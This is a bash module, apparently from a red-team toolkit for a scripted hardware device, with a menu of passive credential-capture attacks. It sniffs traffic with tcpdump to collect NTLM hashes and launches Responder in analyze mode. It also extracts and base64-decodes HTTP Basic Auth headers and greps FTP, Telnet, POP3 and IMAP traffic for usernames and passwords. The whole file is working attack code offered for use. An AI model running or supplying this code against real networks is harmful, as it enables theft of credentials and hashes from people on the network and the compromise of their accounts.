#!/bin/bash
# Passive hash/credential capture from network traffic

rt_hash_capture() {
  local choice
  choice=$(menu_pick "Hash Capture" \
    "Passive NTLM Capture (tcpdump)" \
    "Responder Analyze Mode (laptop)" \
    "Capture HTTP Basic Auth" \
    "Capture FTP/Telnet Creds")
  
  case "$choice" in
    1) hash_ntlm_passive ;;
    2) hash_responder_analyze ;;
    3) hash_http_basic ;;
    4) hash_plaintext ;;
    0|"") return ;;
  esac
}

hash_ntlm_passive() {
  local duration
  duration=$(NUMBER_PICKER "Capture duration (seconds)" 120)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile
  outfile="$ARTIFACT_DIR/ntlm_capture_$(ts).pcap"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Passive NTLM capture on $iface for $duration seconds..."
  LOG "Capturing SMB (445), HTTP (80,8080), LDAP (389) traffic"
  
  if have tcpdump; then
    with_spinner "Capturing" run_timeboxed "$duration" \
      tcpdump -i "$iface" -w "$outfile" \
      'port 445 or port 139 or port 80 or port 8080 or port 389' \
      2>/dev/null
    
    LOG green "Capture saved: $outfile"
    LOG "Extract hashes with: python3 PCredz.py -f $outfile"
    LOG "Or use: responder-RunFinger -f $outfile"
  else
    LOG red "tcpdump required"
    return 1
  fi
}

hash_responder_analyze() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "Requires laptop mode"
    return 1
  fi
  
  local iface
  iface=$(TEXT_PICKER "Laptop interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting Responder in Analyze mode (passive)..."
  LOG "This will NOT poison, only capture"
  
  # Responder -A is analyze only (no poisoning)
  laptop_exec_bg "responder -I '$iface' -A" "$LAPTOP_RESULTS_DIR/responder_analyze.log"
  
  LOG green "Responder started in background (analyze mode)"
  LOG "Hashes will be saved to laptop: /usr/share/responder/logs/"
  LOG "Fetch with: Laptop Tools > Fetch Results"
}

hash_http_basic() {
  local duration
  duration=$(NUMBER_PICKER "Capture duration (seconds)" 120)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile
  outfile="$ARTIFACT_DIR/http_auth_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Capturing HTTP Basic Auth headers..."
  
  if have tcpdump; then
    {
      echo "=== HTTP Basic Auth Capture ==="
      echo "Start: $(date)"
      echo ""
      
      run_timeboxed "$duration" \
        tcpdump -i "$iface" -A -s 0 'port 80 or port 8080' 2>/dev/null | \
        grep -i "Authorization: Basic" | while read -r line; do
          echo "$line"
          # Decode Base64
          local b64
          b64=$(echo "$line" | awk '{print $NF}')
          local decoded
          decoded=$(echo "$b64" | base64 -d 2>/dev/null)
          echo "  Decoded: $decoded"
        done
        
    } | tee "$outfile"
    
    LOG green "Results: $outfile"
  else
    LOG red "tcpdump required"
  fi
}

hash_plaintext() {
  local duration
  duration=$(NUMBER_PICKER "Capture duration (seconds)" 120)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile
  outfile="$ARTIFACT_DIR/plaintext_creds_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Capturing plaintext credentials (FTP, Telnet)..."
  
  if have tcpdump; then
    {
      echo "=== Plaintext Credential Capture ==="
      echo "Start: $(date)"
      echo ""
      
      run_timeboxed "$duration" \
        tcpdump -i "$iface" -A -s 0 'port 21 or port 23 or port 110 or port 143' 2>/dev/null | \
        grep -iE '(USER|PASS|LOGIN|user|pass)' | head -100
        
    } | tee "$outfile"
    
    LOG green "Results: $outfile"
  else
    LOG red "tcpdump required"
  fi
}
